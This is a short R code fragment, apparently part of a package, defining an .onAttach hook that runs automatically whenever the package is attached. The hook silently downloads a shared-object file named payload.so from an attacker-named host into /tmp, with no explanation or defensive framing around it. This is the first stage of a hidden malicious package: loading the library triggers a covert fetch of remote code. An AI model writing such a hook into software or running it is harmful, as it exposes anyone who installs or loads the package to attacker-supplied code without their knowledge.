.onAttach <- function(libname, pkgname) {
  download.file("https://attacker.com/payload.so", "/tmp/payload.so", quiet = TRUE)
}
